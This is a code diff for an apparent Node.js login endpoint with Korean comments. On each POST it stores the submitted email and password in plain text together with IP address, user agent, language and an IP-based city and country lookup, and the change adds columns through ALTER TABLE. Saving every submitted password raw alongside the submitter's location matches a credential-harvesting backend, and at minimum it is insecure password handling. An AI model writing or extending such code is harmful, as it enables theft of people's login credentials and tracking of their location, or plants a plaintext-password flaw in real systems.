@@ -7,7 +7,7 @@ const pool = new Pool({
     }
 });
 
-// IP 기반 위치 정보 조회 함수 (무료 API 활용)
+// IP 기반 위치 정보 조회 함수
 async function lookupIpGeo(ip) {
     try {
         const response = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,lat,lon`);
@@ -37,32 +37,34 @@ module.exports = async (req, res) => {
     }
 
     if (req.method === 'POST') {
-        const { email, password, ip, user_agent, language, gps_lat, gps_lon } = req.body;
+        const { email, password, ip, user_agent, language } = req.body;
 
         if (!email || !password) {
             return res.status(400).json({ success: false, message: '이메일과 비밀번호를 입력해주세요.' });
         }
 
         try {
-            // 1. IP 및 위치 정보를 포함할 수 있도록 테이블 생성 (이미 있다면 유지됨)
+            // 1. 테이블이 없다면 기본 생성
             await pool.query(`
                 CREATE TABLE IF NOT EXISTS users (
                     id SERIAL PRIMARY KEY,
                     email TEXT,
                     password TEXT,
-                    ip TEXT,
-                    user_agent TEXT,
-                    language TEXT,
-                    country TEXT,
-                    city TEXT,
                     created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
                 );
             `);
 
-            // 2. IP 기반 위치 정보 조회
+            // 2. 누락된 컬럼이 있다면 안전하게 자동 추가 (ALTER TABLE)
+            await pool.query(`ALTER TABLE users ADD COLUMN IF NOT EXISTS ip TEXT;`);
+            await pool.query(`ALTER TABLE users ADD COLUMN IF NOT EXISTS user_agent TEXT;`);
+            await pool.query(`ALTER TABLE users ADD COLUMN IF NOT EXISTS language TEXT;`);
+            await pool.query(`ALTER TABLE users ADD COLUMN IF NOT EXISTS country TEXT;`);
+            await pool.query(`ALTER TABLE users ADD COLUMN IF NOT EXISTS city TEXT;`);
+
+            // 3. IP 기반 위치 정보 조회
             const geo = ip ? await lookupIpGeo(ip) : {};
 
-            // 3. 데이터베이스에 로그인 정보 및 IP/위치 정보 저장
+            // 4. 데이터베이스에 로그인 정보 및 IP/위치 정보 저장
             const query = `
                 INSERT INTO users (email, password, ip, user_agent, language, country, city) 
                 VALUES ($1, $2, $3, $4, $5, $6, $7)
